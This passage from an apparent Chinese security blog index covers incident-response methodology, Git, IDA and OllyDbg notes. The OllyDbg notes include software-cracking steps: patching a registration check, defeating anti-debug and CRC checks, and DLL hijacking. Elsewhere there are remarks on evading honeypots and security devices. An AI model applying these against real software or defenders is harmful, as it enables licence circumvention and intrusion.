对于防守方来说，从行为检测上看，其实0day并没有那么可怕，即使遭遇0day攻击，主机上的对抗也会回到基本面上，比如：Webshell、恶意命令、反弹Shell、端口扫描、黑客工具、端口转发、提权、C2通信等等，这里就要求防守方超越IoC和传统黑特征的束缚，不依赖对特定漏洞利用的先验知识，而全面基于行为数据进行建模，从而拥有发现和识别通过未知漏洞突破的恶意活动检测能力。对于完善的纵深防御体系来说，抓住端点上的蛛丝马迹，可能在攻击者尝试执行探测命令时就可以告警了，甚至可以用蜜罐捕获0day。攻击队的0day利用也需要深思熟虑，识别绕过蜜罐，并尽量趋向于合法操作，比如添加账号，而不是执行黑命令或者直接反弹Shell。\n高效的“检测”与“响应”能力\n开发阶段预防\n坑 应急人员需要保持清醒的头脑，冷静处理问题。整个应急流程中要注意：\n一、多和客户进行交流，询问运维人员及其他人员在事件发生后所做的操作是什么；\n二、询问客户部署有哪些安全设备有哪些，安全设备能够帮助应急人员少走很多弯路；\n三、遇到特殊操作，需获得客户授权，经用户授权后再进行处置；\n四、整个处置过程中，发现的异常问题及时上报并截图留存处置细节(最好带有时间戳)；\n五、整个处置过程中遇到的恶意病毒样本需要在桌面等位置建立相关文件夹，把恶意文件存放在桌面上，以便后续取出分析；\n数据储备 此时，全网数据和被动信息搜集就会变得非常有价值，比如DNS历史解析记录、Whois历史信息、历史端口开放情况、网络流量信息等等，这些数据可以帮助你：\n 找出网站真实IP，挖掘相邻网段、绕过安全设备 判断目标是否为蜜罐 定位内网IP和系统 定位关键的应用系统  ","permalink":"https://inten.kro1lsec.com/post/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/","summary":"https://bypass007.github.io/Emergency-Response-Notes/ 应急响应笔记\nhttps://www.cnblogs.com/H4ck3R-XiX/p/12234762.html Nmap使用教程（进阶篇）\n方法论 浅谈我所理解的应急响应流程\nhttps://www.freebuf.com/column/193690.html\r应急响应的整体思路和基本流程\nhttps://www.freebuf.com/articles/terminal/192859.html\r应急响应方式 现场应急响应：通常是要到客户突发现场进行应急处置。需注意相关操作必须获得用户授权，并对操作过程进行记录。 远程应急响应：远程通过电话、邮件等方式指导用户进行应急处置。\n应急响应流程 业内通常使用的\nPDCERF方法学 准备阶段——\u0026gt;检测阶段——\u0026gt;抑制阶段——\u0026gt;根除阶段——\u0026gt;恢复阶段——\u0026gt;跟踪总结\n准备阶段 准备阶段需要及时和客户确认事件背景、相关负责人联系方式、确定参与此次应急响应人员、根据客户描述，初步判定事件响应策略，携带应急响应工具包前往客户现场。\n准备阶段主要包括：事件背景、响应人员确定、事件响应策略、相关负责人联系方式、应急响应相关授权、应急响应工具包、应急响应手册等。\n检测阶段 检测阶段确认入侵事件是否发生，如真发生了入侵事件，评估造成的危害、范围以及发展的速度，事件会不会进一步升级。然后根据评估结果通知相关的人员进入应急的流程。\n检测阶段主要包括：事件类型、事件影响范围、受影响系统、事件发展趋势、安全设备等。\n备注：事件类型分类\n安全事件分类主要参考中央网信办发布《国家网络安全事件应急预案》，网络安全事件分为有害程序事件、网络攻击事件、信息破坏事件、信息内容安全事件、设备设施故障、灾害性事件和其他网络安全事件等。 （1）有害程序事件分为计算机病毒事件、蠕虫事件、特洛伊木马事件、僵尸网络事件、混合程序攻击事件、网页内嵌恶意代码事件和其他有害程序事件。 （2）网络攻击事件分为拒绝服务攻击事件、后门攻击事件、漏洞攻击事件、网络扫描窃听事件、网络钓鱼事件、干扰事件和其他网络攻击事件。 （3）信息破坏事件分为信息篡改事件、信息假冒事件、信息泄露事件、信息窃取事件、信息丢失事件和其他信息破坏事件。 （4）信息内容安全事件是指通过网络传播法律法规禁止信息，组织非法串联、煽动集会游行或炒作敏感问题并危害国家安全、社会稳定和公众利益的事件。 （5）设备设施故障分为软硬件自身故障、外围保障设施故障、人为破坏事故和其他设备设施故障。 （6）灾害性事件是指由自然灾害等其他突发事件导致的网络安全事件。 （7）其他事件是指不能归为以上分类的网络安全事件\n抑制阶段 采用针对性的安全措施降低事件损失、避免安全事件的扩散和安全事件对受害系统的持续性破坏。主要分为：物理遏制、网络遏制、主机遏制、应用遏制等。常见手段：断网、降权、网络封堵等。\n根除阶段 本阶段主要任务是通过事件分析查明事件危害的方式，并且给出清除危害的解决方案。个人认为可以从以下几个方面入手：系统基本信息、网络排查、进程排查、注册表排查、计划任务排查、服务排查、关键目录排查、用户组排查、事件日志排查、webshell排查、中间件日志排查、安全设备日志排查等。\n恢复阶段 恢复系统的运行过程，就是把受影响系统、设备、软件和应用服务还原到正常的工作状态；系统恢复、网络恢复、用户恢复、数据恢复以及重新部署。常见手段：系统重装、补丁加固、网络恢复、密码重置、木马清除等。\n跟踪阶段 在业务系统恢复后，需要整理一份详细的事件总结报告，包括事件发生及各部门介入处理的时间线，事件可能造成的损失，为客户提供安全加固优化建议。\n跟踪阶段主要包括：调查事件原因，输出应急响应报告，提供安全建议、加强安全教育、避免同类事件再次发生。\n常规流程 **收集信息：**收集客户信息和中毒主机信息，包括样本。\n**判断类型：**判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DoS等等。\n**深入分析：**日志分析、进程分析、启动项分析、样本分析。\n**清理处置：**直接杀掉进程，删除文件，打补丁，抑或是修复文件。\n**产出报告：**整理并输出完整的安全事件报告。\n系统日志及日志分析 日志类型  **Windows系统日志：**Windows系统自带的审计日志、操作日志、故障日志。\n**Linux系统日志：**Linux系统自带的审计日志、操作日志、故障日志。\n**应用日志：**包括但不限于Web应用等众多繁杂的日志。\n Windows系统日志\n 日志路径：C:\\Windows\\System32\\winevt\\Logs\n必看日志：Security.evtx、System.evtx、Application.evtx\n Linux系统日志\n 日志路径：/var/log\n必看日志：secure、history\n 威胁情报的作用 威胁情报有时候会给我们提供大量有用的信息，甚至直接推动了安全事件的快速响应。\n威胁情报的元素，包括但不限于域名、URL、IP、文件Hash、文件路径、文件名、数字签名、备案信息、排名信息。\n域名 威胁情报中，域名扮演着极为基础和关键的角色，URL也是以域名为基础的。这里列举若干类域名，是属于黑客常用（偏爱）的域名，取证过程中需要重点关注这类域名的信息。\n随机域名（DGA）： 动态域名： 动态域名是子域名开放给其他人使用，并且子域名绑定的IP是可以动态获取的，大多数是免费的，因此常被黑客所使用，如 abc.","title":"应急响应"},{"content":"","permalink":"https://inten.kro1lsec.com/about/","summary":"","title":"About"},{"content":"目的： 解决md文件图片传输不方便的问题，将图片上传到图床，方便分享md文件。\n运行环境 win10\nversion 0. 9. 98 (beta)★website★@typora\npicgo-2.2.2\n1.去官网下载最新的typora和picgo，并安装 2.配置typora 2.配置picgo 修改端口\n安装插件\n配置Chevereto\n注意仔细核对url\n\u0026#34;url\u0026#34;: \u0026#34;https://个人服务器Cheverto图床域名或地址/api/1/upload\u0026#34; 记得打开时间戳重命名，Chevereto不允许上传同名图片，不然会出现以下错误。\n我测试时\npicgo的时间戳不会重命名typora的验证图片时的测试图片，所以会出现第一次验证成功，之后失败的情况。\n实际功能正常。\n踩坑与调试 1.为什么原来的URL不行\n可以说得按照官方文档来，乱填url当然不行，感觉这样的回答太牵强。\n我推测是图像界面面向用户上传图片的调用方法 和 为PicGo这类用于快速上传图片并获取图片 URL 链接的工具的接口不一样。后者至少比前者多一个获取图片 URL 链接的返回数据。如果用前者的url那typora就收不到图片的链接，功能会无法实现\n2.为什么现在这个URL可以\n按照chevereto官方文档的说明（https://v3-docs.chevereto.com/API/V1.html#api-call）\n我们最好采用“POST”的形式来传数据。默认的上传url为： https://mysite.com/api/1/upload\n为什么锁定是url的问题？\n假设Typora + PicGo+ Chevereto这三个软件及插件都没问题，key也没问题。\nPicGo的本质还是收发数据包吧，我没有去看源码，但感觉和web端的通信是通过给url传不同的参数来实现。\n要么传的参数有问题，要么url有问题，逐个排查也可。参数大概是软件设置的选项，然后我也一直在调，常见的问题都搜过了，小概率是问题太偏。但url真的很可疑呀，我填的时候没有想太多，就理所当然地复制了。连文档都没查，参考的博客看得也不仔细。\n","permalink":"https://inten.kro1lsec.com/post/typora-+-picgo+-chevereto/","summary":"目的： 解决md文件图片传输不方便的问题，将图片上传到图床，方便分享md文件。\n运行环境 win10\nversion 0. 9. 98 (beta)★website★@typora\npicgo-2.2.2\n1.去官网下载最新的typora和picgo，并安装 2.配置typora 2.配置picgo 修改端口\n安装插件\n配置Chevereto\n注意仔细核对url\n\u0026#34;url\u0026#34;: \u0026#34;https://个人服务器Cheverto图床域名或地址/api/1/upload\u0026#34; 记得打开时间戳重命名，Chevereto不允许上传同名图片，不然会出现以下错误。\n我测试时\npicgo的时间戳不会重命名typora的验证图片时的测试图片，所以会出现第一次验证成功，之后失败的情况。\n实际功能正常。\n踩坑与调试 1.为什么原来的URL不行\n可以说得按照官方文档来，乱填url当然不行，感觉这样的回答太牵强。\n我推测是图像界面面向用户上传图片的调用方法 和 为PicGo这类用于快速上传图片并获取图片 URL 链接的工具的接口不一样。后者至少比前者多一个获取图片 URL 链接的返回数据。如果用前者的url那typora就收不到图片的链接，功能会无法实现\n2.为什么现在这个URL可以\n按照chevereto官方文档的说明（https://v3-docs.chevereto.com/API/V1.html#api-call）\n我们最好采用“POST”的形式来传数据。默认的上传url为： https://mysite.com/api/1/upload\n为什么锁定是url的问题？\n假设Typora + PicGo+ Chevereto这三个软件及插件都没问题，key也没问题。\nPicGo的本质还是收发数据包吧，我没有去看源码，但感觉和web端的通信是通过给url传不同的参数来实现。\n要么传的参数有问题，要么url有问题，逐个排查也可。参数大概是软件设置的选项，然后我也一直在调，常见的问题都搜过了，小概率是问题太偏。但url真的很可疑呀，我填的时候没有想太多，就理所当然地复制了。连文档都没查，参考的博客看得也不仔细。","title":"Typora + PicGo+ Chevereto踩坑指南"},{"content":"Git基本操作 初次使用需要配置好邮箱用户名，ssh或token\nhttps://docs.github.com/cn/github/getting-started-with-github/quickstart\n大致流程 1.链接\n2.增删改查\n3.提交更改\n4.提交分支\necho \u0026#34;# KroCTF\u0026#34; \u0026gt;\u0026gt; README.md git init git add README.md git commit -m \u0026#34;first commit\u0026#34; git branch -M main git remote add origin https://github.com/1nten/KroCTF.git git push -u origin main 配置 $ git config --global user.email \u0026#34;email@example.com\u0026#34; $ git config --global user.name \u0026#34;Mona Lisa\u0026#34; $ git config --global user.name $ git config --global user.email 基础信息 //显示工作目录和暂存区的状态 $ git status //显示日志（项目历史的信息） $ git log //将分支new1同步到云端GitHub $ git push origin new1 //克隆 $ git clone https://github.com/1nten/codeql.git //初始化 $ git init 链接 //创建链接origin $ git remote add origin https://github.com/1nten/test1.git //删除链接origin $ git remote rm origin 分支 //创建分支new1 $ git branch new1 //切换分支new1 $ git checkout new1 //删除本地分支new1 $ git branch --delete new1 //删除远程分支new1 $ git push origin --delete new1 //合并分支 61445@Social MINGW64 ~/Desktop/github (new1) $ git checkout main Switched to branch \u0026#39;main\u0026#39; 61445@Social MINGW64 ~/Desktop/github (main) $ git merge new1 Updating 94b56ea..ee28bef Fast-forward test.md | 1 + test.txt | 1 - 2 files changed, 1 insertion(+), 1 deletion(-) create mode 100644 test.md delete mode 100644 test.txt 文件 //创建文件test.md $ echo \u0026#34;## hello git\u0026#34; \u0026gt;\u0026gt; test.md //添加文件test.md $ git add test.md //提交更改文件test.md $ git commit -m \u0026#34;这是个测试文件\u0026#34; test.md //将分支new1同步到云端GitHub $ git push origin new1 //删除文件test.txt $ git rm test.txt //提交更改文件test.txt $ git commit -m \u0026#34;这是个测试文件\u0026#34; test.txt //将分支new1同步到云端GitHub $ git push origin new1 调试信息 参考链接 https://zhuanlan.zhihu.com/p/88246764\nhttps://docs.github.com/cn/github/getting-started-with-github/quickstart\nhttps://training.github.com/downloads/zh_CN/github-git-cheat-sheet/\n","permalink":"https://inten.kro1lsec.com/post/%E5%B7%A5%E5%85%B7github%E5%88%9D%E5%85%A5/","summary":"Git基本操作 初次使用需要配置好邮箱用户名，ssh或token\nhttps://docs.github.com/cn/github/getting-started-with-github/quickstart\n大致流程 1.链接\n2.增删改查\n3.提交更改\n4.提交分支\necho \u0026#34;# KroCTF\u0026#34; \u0026gt;\u0026gt; README.md git init git add README.md git commit -m \u0026#34;first commit\u0026#34; git branch -M main git remote add origin https://github.com/1nten/KroCTF.git git push -u origin main 配置 $ git config --global user.email \u0026#34;email@example.com\u0026#34; $ git config --global user.name \u0026#34;Mona Lisa\u0026#34; $ git config --global user.name $ git config --global user.email 基础信息 //显示工作目录和暂存区的状态 $ git status //显示日志（项目历史的信息） $ git log //将分支new1同步到云端GitHub $ git push origin new1 //克隆 $ git clone https://github.","title":"[工具]Github初入"},{"content":"简介 加密与解密 p122\n再探 IDA 常用操作 窗口介绍 Structures 结构体窗口\n显示硬编码 ACDU\na 字符串\n跳转指令 G\n搜索（汇编）指令 Alt + t\n重命名 n\nAlt + q 引用结构体窗口中对应的结构体\n局部变量指定结构体 T\ny 改函数的声明\nd 改类型\n注释 ; 会在任何引用该位置的地方留下注释的副本\n：引用的地方没有副本\n针对函数的注释 选中函数按;\n会显示在被注释函数的上方\n交叉引用 Ctrl+x\n所有调用该函数 / 数据的地方\n在 F5 的界面里，选定一个函数按 X 交叉引用\nIDA PATCH 修改错误无法撤销\n保存文件\n导入头文件 注意：即使导入头文件，也无法识别标准库函数\n新建结构体 在结构体窗口按 insert\nd 添加成员\n实战技巧 IDA 类型识别错误 *(_BYTE *)(i + a2) = byte_442198[j] ^ (*(_BYTE *)(i + a1) + 13); 当出现 (_BYTE ) 这种类型，多半是识别错误\nIDA 是动态识别的\n有时候函数可能会少参数，先进入函数再退出即可正确识别\n字符串识别错误\n再按一次 f5 实现刷新\nKEYPATCH 修改汇编指令\npatch 指令和正常汇编不太一样\nIDA 不支持 jmp 0x12345678 的写法，应该改成 jmp 12345678h\nida 对数据作用有严格区分 需要先转化成 Code 再 assembly\n修改硬编码\n强制分析\nu ：取消分析\nd：作为数据分析\nc ： 作为汇编指令分析（选中指令起始的那一行）\n例：\n改着改着 ida 就识别不出来这是汇编指令了，强制分析也不顶用 。\n要只选中 E9 一行那一行，ida 分析的才是正确的。多选几行或者选中 f9 那行都不能正确识别 。\n同样的硬编码翻译成汇编还可以不一样\n“你把那个补码转成原码对比下就知道为啥了”\n内存 dump 脚本 调试程序时偶尔会需要 dump 内存，但 IDA Pro 没有直接提供此功能，可以通过脚本来实现。\nimport idaapi\rdata = idaapi.dbg_read_memory(start_address, data_length)fp = open('path/to/dump', 'wb')fp.write(data)fp.close()\r堆栈不平衡 某些函数在使用 f5 进行反编译时，会提示错误 \u0026ldquo;sp-analysis failed\u0026rdquo;，导致无法正确反编译。原因可能是在代码执行中的 pop、push 操作不匹配，导致解析的时候 esp 发生错误。\n解决办法步骤如下：\n 用 Option-\u0026gt;General-\u0026gt;Disassembly, 将选项 Stack pointer 打钩 仔细观察每条 call sub_xxxxxx 前后的堆栈指针是否平衡 有时还要看被调用的 sub_xxxxxx 内部的堆栈情况，主要是看入栈的参数与 ret xx 是否匹配 注意观察 jmp 指令前后的堆栈是否有变化 有时用 Edit-\u0026gt;Functions-\u0026gt;Edit function\u0026hellip;,然后点击 OK 刷一下函数定义  常用插件  IDA FLIRT Signature Database \u0026ndash; 用于识别静态编译的可执行文件中的库函数 Find Crypt \u0026ndash; 寻找常用加密算法中的常数（需要安装 yara-python） IDA signsrch \u0026ndash; 寻找二进制文件所使用的加密、压缩算法 Ponce \u0026ndash; 污点分析和符号化执行工具 snowman decompiler \u0026ndash; C/C++反汇编插件（F3 进行反汇编） CodeXplorer \u0026ndash; 自动类型重建以及对象浏览（C++）（jump to disasm) IDA Ref \u0026ndash; 汇编指令注释（支持arm，x86，mips） auto re \u0026ndash; 函数自动重命名 nao \u0026ndash; dead code 清除 HexRaysPyTools \u0026ndash; 类/结构体创建和虚函数表检测 DIE \u0026ndash; 动态调试增强工具，保存函数调用上下文信息 sk3wldbg \u0026ndash; IDA 动态调试器，支持多平台 idaemu \u0026ndash; 模拟代码执行（支持X86、ARM平台） Diaphora \u0026ndash; 程序差异比较 Keypatch \u0026ndash; 基于 Keystone 的 Patch 二进制文件插件 FRIEND \u0026ndash; 哪里不会点哪里，提升汇编格式的可读性、提供指令、寄存器的文档等 SimplifyGraph \u0026ndash; 简化复杂的函数流程图 bincat \u0026ndash; 静态二进制代码分析工具包，2017 Hex-Rays 插件第一名 golang_loader_assist \u0026ndash; Golang编译的二进制文件分析助手 BinDiff  ","permalink":"https://inten.kro1lsec.com/post/%E5%B7%A5%E5%85%B7ida/","summary":"简介 加密与解密 p122\n再探 IDA 常用操作 窗口介绍 Structures 结构体窗口\n显示硬编码 ACDU\na 字符串\n跳转指令 G\n搜索（汇编）指令 Alt + t\n重命名 n\nAlt + q 引用结构体窗口中对应的结构体\n局部变量指定结构体 T\ny 改函数的声明\nd 改类型\n注释 ; 会在任何引用该位置的地方留下注释的副本\n：引用的地方没有副本\n针对函数的注释 选中函数按;\n会显示在被注释函数的上方\n交叉引用 Ctrl+x\n所有调用该函数 / 数据的地方\n在 F5 的界面里，选定一个函数按 X 交叉引用\nIDA PATCH 修改错误无法撤销\n保存文件\n导入头文件 注意：即使导入头文件，也无法识别标准库函数\n新建结构体 在结构体窗口按 insert\nd 添加成员\n实战技巧 IDA 类型识别错误 *(_BYTE *)(i + a2) = byte_442198[j] ^ (*(_BYTE *)(i + a1) + 13); 当出现 (_BYTE ) 这种类型，多半是识别错误","title":"[工具]IDA"},{"content":"简介 快捷键  Ctrl+F1：打开与所选行内符号相关的 API 帮助文档。 F2：在光标选定位置按 F2 键设置或取消断点。 Shift+F2：在首个选择命令设置条件断点。 Ctrl+F2：重新启动被调试程序。 F4：运行到光标选定位置处暂停。 Shift+F4：设置记录断点。 F5：最大化当前窗口。 Ctrl+F5：打开与首个选择的命令相对应的源文件。 Alt+F5：让 OllyDbg 窗口总在最前面。 F6：切换到下一个窗口。 Shift+F6：切换到前一个窗口。 F7：单步步入：每次执行一条指令，遇到 call 等子程序时进入其中。 Shift+F7：与 F7 相同，但当被调试程序发生异常而中止时，调试器首先尝试步入被调试程序指定的异常处理。 Ctrl+F7：自动步入，在所有的函数调用中一条一条地执行命令。 Alt+F7：转到上一个找到的参考。 F8：单步步过，每次执行一条指令，遇到 call 等子程序时不进入其中。 Shift+F8：与 F8 相同，但当被调试程序发生异常而中止时，调试器首先尝试步过被调试程序指定的异常处理。 Ctrl+F8：自动步过，一条一条执行命令，但不进入函数内部调用。 Alt+F8：转到下一个找到的参考。 F9：运行，被调试软件继续运行，直到遇到下一个断点。 Shift+F9：与 F9 相同，但当被调试程序发生异常而中止时，调试器首先尝试执行被调试程序指定的异常处理。 Ctrl+F9：执行到返回，在执行到一个 ret 指令时暂停，常用于从当前函数快速返回到上一个函数。 Alt+F9：执行到用户代码，可用于从系统部分快速返回到被调试程序部分。 F10：打开与当前窗口或面板相关的快捷菜单。 Ctrl+F11：Run 跟踪步入，一条一条执行命令，进入子函数调用，并把寄存器信息加入到 Run 跟踪的存储数据中。 F12：停止执行，暂停所有线程。 Ctrl+F12：Run 跟踪步过，一条一条执行命令，不进入子函数调用，并把寄存器信息加入到 Run 跟踪的存储数据中。 Alt+F3：关闭当前窗口。 Alt+B：显示断点窗口。 Alt+C：显示 CPU 窗口。 Alt+E：显示模块列表。 Alt+K：显示调用栈。 Alt+L：显示日志窗口。 Alt+M：显示内存窗口。 Alt+O：显示选项对话框。 Alt+Backspace：撤销对所选部分的修改。 Ctrl+A：分析当前模块的代码段。 Ctrl+B：开始二进制搜索。 Ctrl+E：以十六进制格式编辑所选内容。 Ctrl+F：开始命令搜索。 Ctrl+G：转到某地址。 Ctrl+J：列出所有的涉及到该位置的调用和跳转。 Ctrl+K：查看与当前函数相关的调用树。 Ctrl+L：搜索下一个。 Ctrl+N：打开当前模块的名称列表。 Ctrl+O：扫描对象文件。 Ctrl+P：显示补丁窗口。 Ctrl+R：搜索所选命令的参考。 Ctrl+S：命令搜索。 Ctrl+T：打开“暂停Run跟踪”对话框。 Esc：停止自动执行或跟踪。 Enter：将选中的命令添加到命令历史，如果当前命令是一个跳转或者函数，则进入到目的地址。 Backspace：如果分析器将代码误识为数据，可以将选中部分的自动分析信息移除。 *：转到原始位置 Ctrl+*：指定新的起始位置。 +：如果 Run 跟踪没有激活，则根据历史命令跳到下一条运行过命令的地方；否则跳到 Run 跟踪的下一个记录。 Ctrl++：跳到前一个函数的开始处。 -：如果 Run 跟踪没有激活，则根据历史命令跳到前一条运行过命令的地方；否则跳到 Run 跟踪的前一个记录。 Ctrl+-：跳到下一个函数的开始处。 Space：修改命令。 :：添加标签。 ;：添加注释。  -（减号）：回看之前单步跟踪的代码\nCtrl + F9: 当位于某个call指令中，想返回调用这个call指令的位置\nCtrl + F2：重新加载程序\nF12：暂停（死循环）\nAlt + B：打开断点窗口，del键删除\nCtrl + G:打开跟随表达式窗口（区分大小写）也可用于跳转地址\nAlt + F9： 回到调用函数的地方\n再探 OD mov [local.1]，eax\n[local.1] 局部变量 1\n[arg-1] 参数 1\n实战的坑 OD 的 BUG od 的汉化版和插件可能会出现坑，可以考虑改用 x64/32dbg。\n可以下内存访问断点，一般都能硬件断点。\n如果不行，1. 调试器有问题 2. 软件 nb\nod 假死 t ：线程 突然暂停，恢复即可\nCtrl+g 插件 bug （.IDAFicator.dll）：硬件断点重启后才会生效（正常情况直接生效）\nvs 编译会生成很多 jmp，叫增量链接（节省源码小改动，重新生成程序的时间），链接器中可以去掉\n常用操作 查找所有命令\n可以找到所有调用该命令的地方，（感觉类似交叉引用）\n搜索下一个 Ctrl+l\n模糊查找 ctrl + b 未知的值用?? 代替\nE8 E0 E9 ?? ?? ?? ?? E8\n条件断点 shift+f12 [esp+4]!=00290642 中文版 od 可能会自动加一些奇怪的东西，可以切换成英文的调试\n自动步过 Ctrl + F8\n走到这个函数的返回 Ctrl+F9\n回退上一步 -\n查看程序调用堆栈 k 通过 dbghelp.del 打印堆栈\n最上面的堆栈离当前位置最近，从下到上依次执行。用 vs 可以看堆栈的情况\n查看程序的所有模块 e 可用于查询基地址\n内存窗口 m 可用于搜索字符串，在智能搜索中找不到的，这里没准能找到\n数据窗口 选择数据窗口 ctrl+e （右键 \u0026raquo; 二进制 \u0026raquo; 编辑）在 ascll 界面输入 “注册失败”，复制 hex 数据\n即可打印：注册失败\n定义成局部变量，编译器 \u0026raquo; 写入代码段，od 无法识别成字符串。（防止 re 小白通过字符串查找，直接定位到关键代码）\n定义成全局变量：编译器 \u0026raquo; 以字符串形式写入 data 段。\nod 可以识别成字符串\n查找二进制字符串： 在数据窗口中\nctrl+b\nctrl+l 下一个\n实战技巧 加壳程序字符串搜索 跑起来之后，m 窗口。代码节开始搜索\n标题提示字符串 setwindowTextA\n硬件 HOOK 进程：不能运行，必须依靠线程运行 宿主\n线程： 寄宿者\n线程上下文：context\nEIP：指向下一条需要执行的代码\n调试寄存器：\nDR0~DR7\nDR7：老大。的其他 DR 里的值是否生效，由 DR7 决定。\n**硬件断点：**下断点后，调试寄存器保存地址，程序执行时读取 DR 寄存器，代码报错，OD 接管\n特点：重启不会消失\n**crc 检测：**程序在任意地方下断点，程序马上死机\n或者全代码校验：另开一个线程，不断计算关键位置的值。\n绕过方法：t 线程窗口，观察哪个线程一直在运行，挂起即可。\n不修改代码\njnz，看 z 标志寄存器，直接改标志寄存器，能够直接在不修改代码的情况下暴力破解。\nEWND 插件 定位易语言窗口, 修改窗口 ID，实现绕过登录窗口，直接加载程序主窗口（push ）\n插件原理：找到易语言体（FF25) 的位置，将 push 指令改为插件枚举到的窗口地址\nIMMLABLE 插件 利用 immlable 插件重命名 call 调用的函数\n因为程序执行的时候可能会反复调用同一个函数，重命名之后方便定位关键点，分析程序逻辑。\n**插件原理：**跟进 call 函数调用的地址（ctrl+g）加标签 新名字即可\n**标签：**给地址取别名。反汇编窗口快捷键 :\nSTRONG OD 插件 可在程序开始时定位到 TLS 函数位置\nNtQueryInformationThread(GetCurrentThread(),ThreadHideFromDebugger,0,0);//不接受内核调试信息 NtQueryInformationProcess(GetCurrentProcess(),ProcessDebugPort,(PVOID)\u0026amp;isDebug,size(DWORD),\u0026amp;isDebug); //查询调试端口 在 32 位条件下把 \u0026amp; isDebug 返回值改为 0\n脚本编写 运用插件：ODbgScript\n脚本示例：\n//隐藏调试器 dbh //从Eip的位置查找第一个特征码 find eip, #E80000000081042417000000C3576174636820757220737465702100# //判断是否找到 cmp $RESULT,0 //如果没找到就跳出到结束 je exit //如果找到就填充成NOP mov [$RESULT], #90909090909090909090909090909090909090909090909090909090# //从Eip的位置查找下一一个特征码 find eip, #E80000000081042425000000C354686520666C616720626567696E7320776974682022666C61677B2200# //判断是否找到 cmp $RESULT, 0 //没找到就退出 je exit. //找到就填充为NOP mov [$RESULT], #909090909090909090909090909090909090909090909090909090909090909090909090909090909090# //定义一个循环的标签,因为下面这个特征码不止一处,所以需要循环多次进行查找 loop: //从Eip的位置查找 find. eip, #E801000000?????????C3# //判断是否找到 cmp $RESULT,O //如果找不到了就退出 je. exit //找到就填充为90 mov [$RESULT], #9090909090909090909090# //继续循环 jmp loop exit: MSG”花指令已去除完毕! \\r\\n Code By:谅游浅笔深画眉/ NCK\u0026#34; ret ALT+K 暂停法 a、如何操作 b、暂停法原理，理解调用堆栈。 调用堆栈究竟是什么东西。 调用堆栈是如何被记录的。 调用堆栈的记录顺序。\nk 查看程序调用堆栈 通过 dbghelp.del 打印堆栈\n自动跟踪法 适用于寻找控制台程序的入口点\n调试 \u0026ndash; 自动步过停到 call 指令，下断点，F7 进去, 再自动步过，删刚刚的断点，下新断点。\nIDA\u0026amp;OD 查找字符串原理 为什么 od 搜不到的字符串，ida 能搜到\nod 智能搜索原理：遍历数据窗口的 16 进制数，如果为 00 结尾，则前面的就是字符串。缺陷：无法搜索到结构体\nida 静态搜索 pe 文件\n易语言多线程特征 根据正常操作流程，ctrl+g 寻找 messgaeBox ，f8 一直跟进发现：\n双击过去\n可见 je..jmp 关键跳\n壳的特征 大多数加壳的软件拖到 od 会有提示，其次是运行前汇编很奇怪，运行时会还原真实代码。\nDLL 劫持 软件加载有就近原则，默认去系统目录下加载 dll，如果根目录下有 dll 文件，则优先加载。将修改过的 dll 放入根目录即可实现 dll 劫持。\n加壳软件的 dll 劫持\n需要在正确的时间，dll 劫持\n方法：\n另开线程延时启动（不靠谱）\n判断解密是否完成（判断某个地址的指令是否等于脱壳后的）\nhookAPI（还没学）\n2.13TRACEME 复现 1.找到关键 API，这样能快速锁定核心代码的区域。\nGetDlgItemTextA\n2.alt+F9，找到调用函数的地址，F2. F9 跑一下\n加密与解密中很详细地写了 GetDlgItemTextA 的核心和分析过程，我就不班门弄斧了。接下来用爆破法，修改 004011F5 为 nop，ZF 寄存器改为 1，保存即可。新程序输入任意值都可注册成功。\n参考资料   http://www.ollydbg.de/\n  https://firmianay.gitbook.io/ctf-all-in-one/2_tools/dong-tai-fen-xi-gong-ju/2.3.2_ollydbg#参考资料)\n  ","permalink":"https://inten.kro1lsec.com/post/%E5%B7%A5%E5%85%B7ollydbg/","summary":"简介 快捷键  Ctrl+F1：打开与所选行内符号相关的 API 帮助文档。 F2：在光标选定位置按 F2 键设置或取消断点。 Shift+F2：在首个选择命令设置条件断点。 Ctrl+F2：重新启动被调试程序。 F4：运行到光标选定位置处暂停。 Shift+F4：设置记录断点。 F5：最大化当前窗口。 Ctrl+F5：打开与首个选择的命令相对应的源文件。 Alt+F5：让 OllyDbg 窗口总在最前面。 F6：切换到下一个窗口。 Shift+F6：切换到前一个窗口。 F7：单步步入：每次执行一条指令，遇到 call 等子程序时进入其中。 Shift+F7：与 F7 相同，但当被调试程序发生异常而中止时，调试器首先尝试步入被调试程序指定的异常处理。 Ctrl+F7：自动步入，在所有的函数调用中一条一条地执行命令。 Alt+F7：转到上一个找到的参考。 F8：单步步过，每次执行一条指令，遇到 call 等子程序时不进入其中。 Shift+F8：与 F8 相同，但当被调试程序发生异常而中止时，调试器首先尝试步过被调试程序指定的异常处理。 Ctrl+F8：自动步过，一条一条执行命令，但不进入函数内部调用。 Alt+F8：转到下一个找到的参考。 F9：运行，被调试软件继续运行，直到遇到下一个断点。 Shift+F9：与 F9 相同，但当被调试程序发生异常而中止时，调试器首先尝试执行被调试程序指定的异常处理。 Ctrl+F9：执行到返回，在执行到一个 ret 指令时暂停，常用于从当前函数快速返回到上一个函数。 Alt+F9：执行到用户代码，可用于从系统部分快速返回到被调试程序部分。 F10：打开与当前窗口或面板相关的快捷菜单。 Ctrl+F11：Run 跟踪步入，一条一条执行命令，进入子函数调用，并把寄存器信息加入到 Run 跟踪的存储数据中。 F12：停止执行，暂停所有线程。 Ctrl+F12：Run 跟踪步过，一条一条执行命令，不进入子函数调用，并把寄存器信息加入到 Run 跟踪的存储数据中。 Alt+F3：关闭当前窗口。 Alt+B：显示断点窗口。 Alt+C：显示 CPU 窗口。 Alt+E：显示模块列表。 Alt+K：显示调用栈。 Alt+L：显示日志窗口。 Alt+M：显示内存窗口。 Alt+O：显示选项对话框。 Alt+Backspace：撤销对所选部分的修改。 Ctrl+A：分析当前模块的代码段。 Ctrl+B：开始二进制搜索。 Ctrl+E：以十六进制格式编辑所选内容。 Ctrl+F：开始命令搜索。 Ctrl+G：转到某地址。 Ctrl+J：列出所有的涉及到该位置的调用和跳转。 Ctrl+K：查看与当前函数相关的调用树。 Ctrl+L：搜索下一个。 Ctrl+N：打开当前模块的名称列表。 Ctrl+O：扫描对象文件。 Ctrl+P：显示补丁窗口。 Ctrl+R：搜索所选命令的参考。 Ctrl+S：命令搜索。 Ctrl+T：打开“暂停Run跟踪”对话框。 Esc：停止自动执行或跟踪。 Enter：将选中的命令添加到命令历史，如果当前命令是一个跳转或者函数，则进入到目的地址。 Backspace：如果分析器将代码误识为数据，可以将选中部分的自动分析信息移除。 